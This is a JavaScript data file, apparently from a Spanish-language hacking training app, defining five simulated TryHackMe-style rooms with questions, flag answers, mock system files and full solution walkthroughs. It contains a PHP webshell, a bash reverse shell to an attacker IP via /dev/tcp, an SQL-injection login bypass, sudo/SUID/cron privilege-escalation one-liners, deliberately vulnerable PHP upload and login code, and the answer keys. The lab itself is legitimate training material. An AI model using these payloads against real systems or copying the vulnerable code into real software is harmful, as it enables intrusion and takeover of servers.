// ============================================================
// HACKFORGE — THM SALAS SIMULADAS
// Escenarios que imitan salas reales de TryHackMe
// ============================================================

export const THM_SALAS = [

  // ──────────────────────────────────────────────────────────
  // SALA 1 — BASIC LINUX
  // ──────────────────────────────────────────────────────────
  {
    id: "basic-linux",
    nombre: "Basic Linux",
    descripcion: "Tu primera máquina Linux. Aprende a moverte por el sistema de archivos, encontrar archivos ocultos y leer flags.",
    dificultad: "Fácil",
    xp: 200,
    tiempo: "30 min",
    color: "#4ade80",
    icon: "🟢",
    tags: ["Linux", "Fundamentos", "Flags"],
    historia: `Has obtenido acceso SSH a un servidor Linux básico.
Tu objetivo: encontrar las dos flags ocultas en el sistema.

IP del objetivo: 10.10.10.10
Usuario: waldo | Contraseña: waldo123

¡Buena suerte, hacker!`,
    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Orientación",
        descripcion: "Primero necesitas saber dónde estás y qué hay en el sistema.",
        preguntas: [
          { pregunta: "¿Cuál es el nombre del usuario actual?", respuesta: "waldo", pista: "Usa el comando whoami" },
          { pregunta: "¿En qué directorio estás al iniciar?", respuesta: "/home/waldo", pista: "Usa pwd para ver tu ubicación actual" },
          { pregunta: "¿Cuántos archivos hay en el directorio home (incluyendo ocultos)?", respuesta: "5", pista: "Usa ls -la y cuenta todos los archivos" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Archivos ocultos",
        descripcion: "Los archivos ocultos en Linux empiezan con punto. Búscalos.",
        preguntas: [
          { pregunta: "¿Cuál es el nombre del archivo oculto en /home/waldo?", respuesta: ".secreto", pista: "ls -la muestra archivos ocultos (empiezan con .)" },
          { pregunta: "¿Qué contiene el archivo .secreto?", respuesta: "THM{h1dd3n_f1l3s_4r3_fun}", pista: "cat .secreto" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Explorando el sistema",
        descripcion: "Busca la flag de root en el sistema.",
        preguntas: [
          { pregunta: "¿Qué hay en /etc/hostname?", respuesta: "basic-linux", pista: "cat /etc/hostname" },
          { pregunta: "¿Cuántos usuarios tienen /bin/bash como shell?", respuesta: "2", pista: "grep /bin/bash /etc/passwd | wc -l" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{b4s1c_l1nux_n00b_t0_h4ck3r}", pista: "Busca archivos .txt en /home con find" }
        ]
      }
    ],
    sistema: {
      usuario: "waldo",
      hostname: "basic-linux",
      directorio_inicial: "/home/waldo",
      archivos: {
        "/home/waldo": ["user.txt", "notas.txt", ".secreto", ".bash_history", "Desktop/"],
        "/home/waldo/Desktop": ["importante.txt"],
        "/etc": ["passwd", "shadow", "hostname", "hosts"],
        "/tmp": [],
        "/root": ["root.txt"],
        "/var/www": [],
        "/home": ["waldo", "root"]
      },
      contenido: {
        "user.txt": "THM{b4s1c_l1nux_n00b_t0_h4ck3r}",
        "notas.txt": "Recordatorios:\n- Cambiar contraseña\n- Actualizar sistema\n- Revisar logs del servidor",
        ".secreto": "THM{h1dd3n_f1l3s_4r3_fun}",
        ".bash_history": "ls -la\npwd\ncd Desktop\ncat importante.txt\ncd ..\nsudo -l\n",
        "importante.txt": "Este archivo tiene informacion importante del proyecto.\nVersion: 1.0\nFecha: 2024-06-01",
        "passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/nologin\nwaldo:x:1000:1000::/home/waldo:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "hostname": "basic-linux",
        "hosts": "127.0.0.1 localhost\n127.0.1.1 basic-linux\n10.10.10.10 basic-linux.thm",
        "root.txt": "THM{r00t_fl4g_s00n_y0u_w1ll_g3t_m3}",
        "shadow": "root:$6$salt$hash_root:18000:0:99999:7:::\nwaldo:$6$salt$hash_waldo:18500:0:99999:7:::"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/find",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/find", "/usr/bin/newgrp"]
    },
    solucion_completa: `# Solución completa — Basic Linux
# =====================================

# Task 1 — Orientación
whoami          # waldo
pwd             # /home/waldo
ls -la          # ver todos los archivos incluyendo ocultos

# Task 2 — Archivos ocultos
ls -la          # ver .secreto
cat .secreto    # THM{h1dd3n_f1l3s_4r3_fun}

# Task 3 — Explorar sistema
cat /etc/hostname           # basic-linux
grep '/bin/bash' /etc/passwd | wc -l   # 2
find /home -name '*.txt' 2>/dev/null   # encuentra user.txt
cat /home/waldo/user.txt    # THM{b4s1c_l1nux_n00b_t0_h4ck3r}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 2 — WEB ENUM
  // ──────────────────────────────────────────────────────────
  {
    id: "web-enum",
    nombre: "Web Enumeration",
    descripcion: "Enumera un servidor web. Encuentra directorios ocultos, credenciales y explota una vulnerabilidad SQLi básica.",
    dificultad: "Fácil",
    xp: 300,
    tiempo: "45 min",
    color: "#38bdf8",
    icon: "🌐",
    tags: ["Web", "SQLi", "gobuster", "Enumeración"],
    historia: `Has encontrado un servidor web corriendo en el puerto 80.
No tienes credenciales. Debes enumerar y explotar.

IP del objetivo: 10.10.20.20
Puerto 80: Apache 2.4.29
Puerto 22: OpenSSH 7.6

Empieza con nmap y luego enumera la web.`,
    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento",
        descripcion: "Primero escanea los puertos para saber qué servicios corren.",
        preguntas: [
          { pregunta: "¿Qué versión de Apache corre en el puerto 80?", respuesta: "2.4.29", pista: "nmap -sV 10.10.20.20" },
          { pregunta: "¿Cuántos puertos TCP están abiertos?", respuesta: "2", pista: "nmap -sV 10.10.20.20 y cuenta los puertos open" },
          { pregunta: "¿Qué dice el archivo robots.txt?", respuesta: "/admin-secret/", pista: "curl http://10.10.20.20/robots.txt" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Enumeración web",
        descripcion: "Usa gobuster para descubrir directorios ocultos.",
        preguntas: [
          { pregunta: "¿Qué directorio de admin encontró gobuster?", respuesta: "/admin", pista: "gobuster dir -u http://10.10.20.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" },
          { pregunta: "¿Qué archivo de backup encontraste?", respuesta: "backup.zip", pista: "gobuster dir -u http://10.10.20.20 -x php,txt,zip,bak" },
          { pregunta: "¿Qué credenciales están en el backup?", respuesta: "admin:password123", pista: "curl http://10.10.20.20/backup.zip y examina el contenido" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — SQL Injection",
        descripcion: "El panel de login es vulnerable a SQLi. Explótalo.",
        preguntas: [
          { pregunta: "¿Cuál es el payload SQLi para bypass de login?", respuesta: "admin'--", pista: "Prueba en el campo usuario: admin'--" },
          { pregunta: "¿Cuál es la user flag después de entrar al panel admin?", respuesta: "THM{w3b_3num_4nd_sql1}", pista: "Después del login, busca la flag en el panel" }
        ]
      }
    ],
    sistema: {
      usuario: "waldo",
      hostname: "web-enum",
      directorio_inicial: "/home/waldo",
      archivos: {
        "/home/waldo": [".bash_history"],
        "/var/www/html": ["index.php", "login.php", "robots.txt", "backup.zip", ".htaccess"],
        "/var/www/html/admin": ["index.php", "flag.txt", "config.php"],
        "/var/www/html/admin-secret": ["notes.txt"],
        "/etc": ["passwd", "hostname"]
      },
      contenido: {
        ".bash_history": "nmap -sV 10.10.20.20\ncurl http://10.10.20.20/robots.txt\ngobuster dir -u http://10.10.20.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\ncurl http://10.10.20.20/backup.zip\n",
        "robots.txt": "User-agent: *\nDisallow: /admin-secret/\nDisallow: /backup.zip\nDisallow: /.git/\n\n# Rutas privadas - no indexar",
        "index.php": "<?php\n// Pagina principal\necho '<h1>Bienvenido al servidor</h1>';\necho '<a href=\"/login.php\">Login Admin</a>';\n?>",
        "login.php": "<?php\n// Login vulnerable a SQLi\n$user = $_POST['username'];\n$pass = $_POST['password'];\n$query = \"SELECT * FROM users WHERE username='$user' AND password='$pass'\";\n// VULNERABLE: no hay prepared statements\n?>",
        "backup.zip": "[Archivo ZIP]\nContenido:\n  credentials.txt: admin:password123\n  db_backup.sql: CREATE TABLE users...\n  config_old.php: $db_pass = 'OldPass123!';",
        "flag.txt": "THM{w3b_3num_4nd_sql1}",
        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'Sup3rS3cr3t!';\n$db_name = 'webapp_db';\n?>",
        "notes.txt": "NOTAS PRIVADAS\n==============\nCredenciales de emergencia: admin:emergency_backup_2024\nServidor de backup: 192.168.100.50\nFlag: THM{r0b0ts_4r3_y0ur_fr13nd}",
        "hostname": "web-enum",
        "passwd": "root:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\nwww-data:x:33:33::/var/www:/nologin"
      },
      nmap_output: `Starting Nmap 7.93
Nmap scan report for 10.10.20.20
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Servidor Web - Login
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed.`,
      gobuster_output: `/index.php      (Status: 200) [Size: 1234]
/login.php      (Status: 200) [Size: 892]
/admin          (Status: 301) [Size: 314]
/backup.zip     (Status: 200) [Size: 4521]
/.htaccess      (Status: 403) [Size: 276]
/robots.txt     (Status: 200) [Size: 156]`,
      sudo_config: "no sudo disponible",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd"]
    },
    solucion_completa: `# Solución completa — Web Enumeration
# ======================================

# Task 1 — Reconocimiento
nmap -sV 10.10.20.20
# Resultado: Puerto 22 (SSH) y 80 (Apache 2.4.29)

curl http://10.10.20.20/robots.txt
# Resultado: Disallow: /admin-secret/ y /backup.zip

# Task 2 — Enumeración web
gobuster dir -u http://10.10.20.20 \\
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
  -x php,txt,zip,bak
# Encuentra: /admin, /backup.zip, /login.php

curl http://10.10.20.20/backup.zip
# Credenciales: admin:password123

# Task 3 — SQL Injection
# En el campo usuario del login escribir:
# admin'--
# Contraseña: cualquiera
# Resultado: Login exitoso como admin
# Flag: THM{w3b_3num_4nd_sql1}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 3 — PRIVILEGE ESCALATION
  // ──────────────────────────────────────────────────────────
  {
    id: "privesc",
    nombre: "Privilege Escalation",
    descripcion: "Eres www-data. Usa vectores clásicos de privesc: sudo, SUID, crontab y credenciales en archivos de config. Escala a root.",
    dificultad: "Medio",
    xp: 400,
    tiempo: "60 min",
    color: "#f59e0b",
    icon: "⬆️",
    tags: ["Privesc", "sudo", "SUID", "crontab"],
    historia: `Has obtenido una shell como www-data después de explotar
una vulnerabilidad en el servidor web.

Ahora necesitas escalar privilegios a root.
Hay múltiples vectores — encuéntralos todos.

Usuario actual: www-data
Objetivo: leer /root/root.txt`,
    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento del sistema",
        descripcion: "Antes de escalar, necesitas entender el sistema.",
        preguntas: [
          { pregunta: "¿Cuál es el usuario actual?", respuesta: "www-data", pista: "whoami" },
          { pregunta: "¿Qué kernel corre el sistema?", respuesta: "5.4.0-150-generic", pista: "uname -r" },
          { pregunta: "¿Cuántos usuarios tienen shell /bin/bash?", respuesta: "2", pista: "grep /bin/bash /etc/passwd | wc -l" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Vector sudo",
        descripcion: "Verifica qué puedes hacer con sudo.",
        preguntas: [
          { pregunta: "¿Qué binario puedes ejecutar con sudo sin contraseña?", respuesta: "/usr/bin/python3", pista: "sudo -l" },
          { pregunta: "¿Cómo escalarías con python3 y sudo?", respuesta: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'", pista: "GTFOBins → python3 → sudo" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Vector SUID",
        descripcion: "Busca binarios con SUID que puedas explotar.",
        preguntas: [
          { pregunta: "¿Qué binario inusual tiene SUID activado?", respuesta: "/usr/bin/find", pista: "find / -perm -4000 2>/dev/null" },
          { pregunta: "¿Cómo explotas find con SUID para obtener shell de root?", respuesta: "find . -exec /bin/sh \\; -quit", pista: "GTFOBins → find → SUID" }
        ]
      },
      {
        id: 4,
        titulo: "Task 4 — Vector crontab",
        descripcion: "Revisa las tareas programadas del sistema.",
        preguntas: [
          { pregunta: "¿Qué script ejecuta root cada 5 minutos?", respuesta: "/opt/cleanup.sh", pista: "cat /etc/crontab" },
          { pregunta: "¿Tiene ese script permisos de escritura para otros usuarios?", respuesta: "si", pista: "ls -la /opt/cleanup.sh — busca -rwxrwxrwx" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{pr1v3sc_m4st3r_4ll_v3ct0rs}", pista: "Escala a root por cualquiera de los vectores y lee /root/root.txt" }
        ]
      }
    ],
    sistema: {
      usuario: "www-data",
      hostname: "privesc-box",
      directorio_inicial: "/var/www/html",
      archivos: {
        "/var/www/html": ["index.php", "config.php", "uploads/"],
        "/home/john": ["user.txt", ".bash_history", "notes.txt"],
        "/opt": ["cleanup.sh", "backup.py"],
        "/etc": ["passwd", "shadow", "crontab", "hostname"],
        "/root": ["root.txt", ".bash_history"],
        "/tmp": []
      },
      contenido: {
        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'DB_P4ssw0rd_2024!';\n$db_name = 'webapp';\n// john:JohnPass123! (credenciales SSH)\n?>",
        "user.txt": "THM{us3r_fl4g_j0hn_1s_h3r3}",
        "notes.txt": "Recordatorios:\n- Renovar certificado SSL\n- Contraseña root: R00tP4ss_D0ntT3llAny0n3!\n- Backup cada lunes",
        ".bash_history": "sudo -l\ncd /opt\ncat cleanup.sh\npython3 -c 'import os'\nfind / -perm -4000 2>/dev/null\ncat /etc/crontab\n",
        "cleanup.sh": "#!/bin/bash\n# Script ejecutado por root cada 5 minutos\n# PERMISOS: -rwxrwxrwx (escribible por todos!)\n\nrm -rf /tmp/*\necho 'Limpieza completada' >> /var/log/cleanup.log",
        "backup.py": "#!/usr/bin/python3\nimport os\nimport shutil\n\n# Backup automatico\nshutil.copytree('/var/www/html', '/backup/web')\nprint('Backup completado')",
        "crontab": "# /etc/crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts /etc/cron.hourly\n*/5 *   * * *   root    /opt/cleanup.sh\n0 2     * * *   root    /opt/backup.py",
        "passwd": "root:x:0:0:root:/root:/bin/bash\njohn:x:1001:1001::/home/john:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin",
        "hostname": "privesc-box",
        "root.txt": "THM{pr1v3sc_m4st3r_4ll_v3ct0rs}",
        "shadow": "root:$6$salt$hash_root_long:18000:0:99999:7:::\njohn:$6$salt$hash_john_long:18500:0:99999:7:::"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/python3",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/find", "/usr/bin/newgrp", "/usr/bin/mount"]
    },
    solucion_completa: `# Solución completa — Privilege Escalation
# ==========================================

# Task 1 — Reconocimiento
whoami          # www-data
uname -r        # 5.4.0-150-generic
grep '/bin/bash' /etc/passwd | wc -l   # 2

# Task 2 — sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.system("/bin/bash")'
# ¡Shell de root!

# Task 3 — SUID
find / -perm -4000 2>/dev/null
# /usr/bin/find tiene SUID

find . -exec /bin/sh \\; -quit
# ¡Shell de root!

# Task 4 — crontab
cat /etc/crontab
# root ejecuta /opt/cleanup.sh cada 5 min

ls -la /opt/cleanup.sh
# -rwxrwxrwx (escribible por todos!)

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/cleanup.sh
# Esperar 5 minutos...
/tmp/rootbash -p
# ¡Root!

cat /root/root.txt
# THM{pr1v3sc_m4st3r_4ll_v3ct0rs}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 4 — REVERSE SHELL
  // ──────────────────────────────────────────────────────────
  {
    id: "reverse-shell",
    nombre: "Reverse Shell & Webshell",
    descripcion: "Sube una webshell PHP, obtén ejecución remota de código y establece una reverse shell estable. Escala a root.",
    dificultad: "Medio",
    xp: 400,
    tiempo: "60 min",
    color: "#f43f5e",
    icon: "🔴",
    tags: ["Webshell", "RCE", "Reverse Shell", "PHP"],
    historia: `Has encontrado una página de subida de archivos sin validación.
Puedes subir cualquier tipo de archivo, incluyendo PHP.

IP del objetivo: 10.10.30.30
Usuario inicial: www-data (a través de webshell)
Objetivo: user.txt y root.txt`,
    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Webshell",
        descripcion: "Crea una webshell PHP básica y súbela al servidor.",
        preguntas: [
          { pregunta: "¿Cuál es el contenido de una webshell PHP básica?", respuesta: "<?php system($_GET['cmd']); ?>", pista: "Una función que ejecuta comandos del sistema" },
          { pregunta: "¿Qué comando ejecutas primero para verificar el RCE?", respuesta: "id", pista: "?cmd=id en la URL de la webshell" },
          { pregunta: "¿Qué usuario está corriendo el servidor web?", respuesta: "www-data", pista: "?cmd=whoami" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Reverse Shell",
        descripcion: "Establece una reverse shell para tener acceso interactivo.",
        preguntas: [
          { pregunta: "¿Qué comando configura el listener en tu Kali?", respuesta: "nc -lnvp 4444", pista: "nc con opciones listen, no-DNS, verbose, port" },
          { pregunta: "¿Cuál es el payload de reverse shell en bash?", respuesta: "bash -i >& /dev/tcp/10.8.0.2/4444 0>&1", pista: "bash -i con redirección a tu IP de tun0" },
          { pregunta: "¿Cómo mejoras la shell básica a TTY?", respuesta: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", pista: "Usa el módulo pty de Python3" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Escalada",
        descripcion: "Desde www-data, escala a root.",
        preguntas: [
          { pregunta: "¿Dónde encontraste credenciales en el servidor web?", respuesta: "/var/www/html/config.php", pista: "cat /var/www/html/config.php" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{w3bsh3ll_t0_r3v3rs3_sh3ll}", pista: "Usa las credenciales encontradas para SSH y lee user.txt" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{full_c0mpr0m1s3d_s3rv3r}", pista: "Escala a root con sudo -l o SUID" }
        ]
      }
    ],
    sistema: {
      usuario: "www-data",
      hostname: "webshell-box",
      directorio_inicial: "/var/www/html",
      archivos: {
        "/var/www/html": ["index.php", "upload.php", "config.php", "uploads/"],
        "/var/www/html/uploads": ["imagen.jpg", "shell.php"],
        "/home/developer": ["user.txt", ".ssh/", ".bash_history"],
        "/home/developer/.ssh": ["id_rsa", "authorized_keys"],
        "/etc": ["passwd", "hostname", "crontab"],
        "/root": ["root.txt"],
        "/tmp": []
      },
      contenido: {
        "index.php": "<?php echo '<h1>Sistema de subida de archivos</h1>';\necho '<form method=\"POST\" enctype=\"multipart/form-data\">';\necho '<input type=\"file\" name=\"file\"><input type=\"submit\" value=\"Subir\">';\necho '</form>'; ?>",
        "upload.php": "<?php\n// VULNERABLE: no valida extensiones\n$target = 'uploads/' . basename($_FILES['file']['name']);\nmove_uploaded_file($_FILES['file']['tmp_name'], $target);\necho 'Archivo subido: ' . $target;\n?>",
        "config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'W3bApp_DB_2024!';\n$db_name = 'webapp';\n\n// SSH developer: Dev3lop3r_P4ss!\n// No commitear esto!\n?>",
        "shell.php": "<?php system($_GET['cmd']); ?>\n// Webshell subida exitosamente",
        "user.txt": "THM{w3bsh3ll_t0_r3v3rs3_sh3ll}",
        ".bash_history": "ls -la\ncat /var/www/html/config.php\nssh developer@localhost\nsudo -l\nfind / -perm -4000 2>/dev/null\n",
        "id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA...(clave privada)\n-----END OPENSSH PRIVATE KEY-----",
        "passwd": "root:x:0:0:root:/root:/bin/bash\ndeveloper:x:1001:1001::/home/developer:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "hostname": "webshell-box",
        "root.txt": "THM{full_c0mpr0m1s3d_s3rv3r}",
        "crontab": "*/5 * * * * root /usr/bin/python3 /opt/monitor.py"
      },
      sudo_config: "(ALL) NOPASSWD: /usr/bin/python3",
      suid_binarios: ["/usr/bin/find", "/usr/bin/sudo", "/usr/bin/passwd"]
    },
    solucion_completa: `# Solución completa — Reverse Shell & Webshell
# ===============================================

# Task 1 — Webshell
# Crear archivo shell.php con contenido:
# <?php system($_GET['cmd']); ?>
# Subir a http://10.10.30.30/upload.php

# Verificar RCE:
# http://10.10.30.30/uploads/shell.php?cmd=id
# Resultado: uid=33(www-data)

# Task 2 — Reverse Shell
# Tu Kali (listener):
nc -lnvp 4444

# Payload en la URL:
# ?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.8.0.2/4444+0>%261"

# Mejorar shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo → fg → export TERM=xterm

# Task 3 — Escalada
cat /var/www/html/config.php
# developer:Dev3lop3r_P4ss!

ssh developer@localhost -p 22
# contraseña: Dev3lop3r_P4ss!
cat /home/developer/user.txt
# THM{w3bsh3ll_t0_r3v3rs3_sh3ll}

sudo -l
# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'
cat /root/root.txt
# THM{full_c0mpr0m1s3d_s3rv3r}`
  },

  // ──────────────────────────────────────────────────────────
  // SALA 5 — SIMPLE CTF (sala completa)
  // ──────────────────────────────────────────────────────────
  {
    id: "simple-ctf",
    nombre: "Simple CTF",
    descripcion: "Una sala completa de principio a fin. Reconocimiento, enumeración web, explotación de CMS vulnerable, SSH y escalada de privilegios.",
    dificultad: "Medio",
    xp: 600,
    tiempo: "90 min",
    color: "#a78bfa",
    icon: "🏆",
    tags: ["CTF Completo", "CMS", "SSH", "Privesc", "Full Pwn"],
    historia: `Esta es tu primera máquina real simulada.
Aplica toda la metodología aprendida.

IP: 10.10.50.50
Sin credenciales iniciales.
Objetivo: user.txt + root.txt

La metodología es:
1. Reconocimiento (nmap)
2. Enumeración (web, servicios)
3. Explotación
4. Escalada
5. Flags`,
    tareas: [
      {
        id: 1,
        titulo: "Task 1 — Reconocimiento",
        descripcion: "Escanea la máquina y determina los servicios expuestos.",
        preguntas: [
          { pregunta: "¿Cuántos puertos están abiertos?", respuesta: "3", pista: "nmap -sV 10.10.50.50" },
          { pregunta: "¿En qué puerto corre FTP?", respuesta: "21", pista: "nmap -sV 10.10.50.50 y busca ftp" },
          { pregunta: "¿Permite login anónimo el FTP?", respuesta: "si", pista: "ftp 10.10.50.50 → usuario: anonymous" },
          { pregunta: "¿Qué versión de CMS corre en el puerto 80?", respuesta: "CMS Made Simple 2.2.8", pista: "curl http://10.10.50.50 o nmap --script=http-generator" }
        ]
      },
      {
        id: 2,
        titulo: "Task 2 — Enumeración",
        descripcion: "Enumera el FTP y el servidor web.",
        preguntas: [
          { pregunta: "¿Qué archivo encontraste en FTP?", respuesta: "ForMitch.txt", pista: "ftp 10.10.50.50 → anonymous → ls → get ForMitch.txt" },
          { pregunta: "¿Qué dice el archivo ForMitch.txt?", respuesta: "mitch:simple_password", pista: "cat ForMitch.txt después de descargarlo" },
          { pregunta: "¿Qué directorio encontró gobuster?", respuesta: "/simple", pista: "gobuster dir -u http://10.10.50.50 -w common.txt" }
        ]
      },
      {
        id: 3,
        titulo: "Task 3 — Explotación",
        descripcion: "CMS Made Simple 2.2.8 tiene una vulnerabilidad CVE-2019-9053 (SQLi). Explótala.",
        preguntas: [
          { pregunta: "¿Cuál es el CVE de la vulnerabilidad del CMS?", respuesta: "CVE-2019-9053", pista: "searchsploit cms made simple 2.2.8" },
          { pregunta: "¿Cuál es el hash de la contraseña de admin extraído por SQLi?", respuesta: "0c01f4468bd75d7a84c7eb73846e8d96", pista: "Ejecuta el exploit: python3 exploit.py -u http://10.10.50.50/simple" },
          { pregunta: "¿Cuál es la contraseña crackeada?", respuesta: "secret", pista: "john --wordlist=rockyou.txt hash.txt" }
        ]
      },
      {
        id: 4,
        titulo: "Task 4 — Acceso SSH y flags",
        descripcion: "Usa las credenciales encontradas para acceder por SSH.",
        preguntas: [
          { pregunta: "¿Con qué usuario accedes por SSH?", respuesta: "mitch", pista: "ssh mitch@10.10.50.50 con la contraseña crackeada" },
          { pregunta: "¿Cuál es la user flag?", respuesta: "THM{s1mpl3_ctf_us3r_fl4g}", pista: "cat /home/mitch/user.txt" },
          { pregunta: "¿Qué puede ejecutar mitch con sudo?", respuesta: "/usr/bin/vim", pista: "sudo -l como usuario mitch" },
          { pregunta: "¿Cuál es la root flag?", respuesta: "THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}", pista: "sudo vim -c ':!/bin/bash' luego cat /root/root.txt" }
        ]
      }
    ],
    sistema: {
      usuario: "mitch",
      hostname: "simple-ctf",
      directorio_inicial: "/home/mitch",
      archivos: {
        "/home/mitch": ["user.txt", ".bash_history", ".viminfo"],
        "/home/sunbath": ["user_bak.txt"],
        "/var/www/html": ["index.html"],
        "/var/www/html/simple": ["index.php", "admin/", "uploads/", "modules/"],
        "/etc": ["passwd", "shadow", "hostname", "crontab"],
        "/root": ["root.txt", ".bash_history"],
        "/tmp": [],
        "/ftp": ["ForMitch.txt"]
      },
      contenido: {
        "user.txt": "THM{s1mpl3_ctf_us3r_fl4g}",
        ".bash_history": "sudo -l\nsudo vim -c ':!/bin/bash'\ncat /root/root.txt\n",
        "ForMitch.txt": "Mitch,\nRecuerda que tu contraseña nueva es: simple_password\nCambiala pronto.\n\nAdmin",
        "user_bak.txt": "Este es un backup del usuario sunbath.",
        "index.html": "<html><body><h1>CMS Made Simple 2.2.8</h1><p>Bienvenido al portal</p></body></html>",
        "passwd": "root:x:0:0:root:/root:/bin/bash\nmitch:x:1001:1001::/home/mitch:/bin/bash\nsunbath:x:1002:1002::/home/sunbath:/bin/bash\nwww-data:x:33:33::/var/www:/nologin",
        "shadow": "root:$6$salt$hash_root:18000::\nmitch:$1$aaa$0c01f4468bd75d7a84c7eb73846e8d96:18500::\nsunbath:$6$salt$hash_sun:18500::",
        "hostname": "simple-ctf",
        "root.txt": "THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}",
        "crontab": "# Crontab del sistema\n*/10 * * * * root /usr/bin/python3 /opt/cleanup.py"
      },
      nmap_output: `Starting Nmap 7.93
Nmap scan report for 10.10.50.50

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_ftp-syst: UNIX Type: L8
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Site doesn't have a title
|_http-generator: CMS Made Simple
2222/tcp open  ssh   OpenSSH 7.2p2 Ubuntu

Service detection performed.`,
      gobuster_output: `/index.html     (Status: 200) [Size: 11321]
/simple         (Status: 301) [Size: 315]
/robots.txt     (Status: 200) [Size: 929]`,
      sudo_config: "(ALL) NOPASSWD: /usr/bin/vim",
      suid_binarios: ["/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/newgrp"]
    },
    solucion_completa: `# Solución completa — Simple CTF
# =================================

# Task 1 — Reconocimiento
nmap -sV 10.10.50.50
# Puertos: 21 (FTP vsftpd), 80 (Apache + CMS Made Simple 2.2.8), 2222 (SSH)
# FTP permite login anónimo

# Task 2 — Enumeración
ftp 10.10.50.50
# usuario: anonymous, pass: (vacío)
# ls → ForMitch.txt
# get ForMitch.txt → cat ForMitch.txt
# Credenciales: mitch:simple_password

gobuster dir -u http://10.10.50.50 -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Encuentra: /simple

# Task 3 — Explotación CVE-2019-9053
searchsploit cms made simple 2.2.8
# CVE-2019-9053 - SQL Injection
python3 46635.py -u http://10.10.50.50/simple
# Hash: 0c01f4468bd75d7a84c7eb73846e8d96
# Salt: 1dac0d92e9fa6bb2

echo "0c01f4468bd75d7a84c7eb73846e8d96" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: secret

# Task 4 — SSH y flags
ssh mitch@10.10.50.50 -p 2222
# password: secret
cat /home/mitch/user.txt
# THM{s1mpl3_ctf_us3r_fl4g}

sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
cat /root/root.txt
# THM{s1mpl3_ctf_r00t_fl4g_c0mpl3t3d}`
  }
];

export default THM_SALAS;
